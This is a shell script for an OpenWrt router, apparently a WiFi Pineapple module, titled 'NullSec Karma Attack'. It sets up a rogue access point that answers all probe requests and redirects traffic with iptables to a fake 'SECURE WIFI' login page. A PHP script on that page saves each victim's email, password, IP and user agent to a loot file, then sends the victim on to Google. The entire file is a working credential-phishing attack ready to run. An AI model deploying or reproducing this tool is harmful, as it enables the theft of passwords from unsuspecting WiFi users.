#!/bin/sh
#===============================================================================
#  NULLSEC KARMA ATTACK - Automated Rogue AP with Credential Capture
#===============================================================================

LOOT_DIR="/mmc/nullsec/creds"
LOG_FILE="/root/nullsec/logs/karma_$(date +%Y%m%d_%H%M%S).log"
PORTAL_DIR="/tmp/nullsec-portal"

mkdir -p "$LOOT_DIR" "$PORTAL_DIR" "$(dirname $LOG_FILE)"

log() { echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE"; }

# Create captive portal
create_portal() {
    log "Creating captive portal..."
    
    cat > "$PORTAL_DIR/index.html" << 'HTML'
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Authentication Required</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #1a1a2e; color: #fff; margin: 0; padding: 20px; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: #16213e; padding: 40px; border-radius: 10px; max-width: 400px; width: 100%; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
        .logo { text-align: center; font-size: 24px; margin-bottom: 20px; color: #e94560; }
        h1 { font-size: 20px; margin-bottom: 10px; }
        p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 5px; background: #0f3460; color: #fff; font-size: 16px; box-sizing: border-box; }
        input::placeholder { color: #666; }
        button { width: 100%; padding: 12px; background: #e94560; color: #fff; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 10px; }
        button:hover { background: #ff6b6b; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🔐 SECURE WIFI</div>
        <h1>Authentication Required</h1>
        <p>Please sign in to access the internet. This network requires authentication for security purposes.</p>
        <form method="POST" action="/capture">
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect to Internet</button>
        </form>
        <div class="footer">Protected by Enterprise Security</div>
    </div>
</body>
</html>
HTML

    # PHP capture script
    cat > "$PORTAL_DIR/capture.php" << 'PHP'
<?php
$creds_file = '/mmc/nullsec/creds/karma_creds.txt';
$time = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$email = isset($_POST['email']) ? $_POST['email'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$ua = $_SERVER['HTTP_USER_AGENT'];

$entry = "[$time] IP:$ip | Email:$email | Pass:$password | UA:$ua\n";
file_put_contents($creds_file, $entry, FILE_APPEND);

// Redirect to success page
header('Location: /success.html');
?>
PHP

    cat > "$PORTAL_DIR/success.html" << 'HTML'
<!DOCTYPE html>
<html>
<head>
    <title>Connected!</title>
    <meta http-equiv="refresh" content="3;url=http://www.google.com">
    <style>
        body { font-family: sans-serif; background: #1a1a2e; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .msg { text-align: center; }
        .check { font-size: 60px; color: #4ade80; }
    </style>
</head>
<body>
    <div class="msg">
        <div class="check">✓</div>
        <h1>Connected Successfully!</h1>
        <p>Redirecting to the internet...</p>
    </div>
</body>
</html>
HTML

    log "Portal created at $PORTAL_DIR"
}

# Start karma attack
start_karma() {
    log "Starting Karma attack..."
    
    # Enable karma mode on management AP
    uci set wireless.@wifi-iface[2].karma='1'
    uci commit wireless
    wifi reload
    
    log "Karma mode enabled - responding to all probe requests"
}

# Start DNS redirect
start_dns_redirect() {
    log "Starting DNS redirect..."
    
    # Redirect all DNS to portal
    iptables -t nat -A PREROUTING -i br-lan -p tcp --dport 80 -j DNAT --to-destination 172.16.52.1:80
    iptables -t nat -A PREROUTING -i br-lan -p tcp --dport 443 -j DNAT --to-destination 172.16.52.1:80
    iptables -t nat -A PREROUTING -i br-lan -p udp --dport 53 -j DNAT --to-destination 172.16.52.1:53
    
    log "Traffic redirected to portal"
}

# Start web server
start_webserver() {
    log "Starting web server..."
    cd "$PORTAL_DIR"
    php-cgi -b 127.0.0.1:9000 &
    uhttpd -f -p 80 -h "$PORTAL_DIR" &
    log "Web server running on port 80"
}

# Monitor captured creds
monitor_creds() {
    log "Monitoring for captured credentials..."
    tail -f "$LOOT_DIR/karma_creds.txt" 2>/dev/null &
}

# Stop karma attack
stop_karma() {
    log "Stopping Karma attack..."
    
    uci set wireless.@wifi-iface[2].karma='0'
    uci commit wireless
    wifi reload
    
    iptables -t nat -F PREROUTING
    killall uhttpd php-cgi 2>/dev/null
    
    log "Karma attack stopped"
    echo ""
    echo "=== CAPTURED CREDENTIALS ==="
    cat "$LOOT_DIR/karma_creds.txt" 2>/dev/null
}

case "${1:-start}" in
    start)
        create_portal
        start_karma
        start_dns_redirect
        start_webserver
        monitor_creds
        log "Karma attack running! Press Ctrl+C to stop."
        ;;
    stop)
        stop_karma
        ;;
    status)
        echo "Karma mode: $(uci get wireless.@wifi-iface[2].karma 2>/dev/null || echo 'unknown')"
        echo "Captured creds: $(wc -l < "$LOOT_DIR/karma_creds.txt" 2>/dev/null || echo 0)"
        ;;
    *)
        echo "NullSec Karma Attack"
        echo "Usage: $0 {start|stop|status}"
        ;;
esac
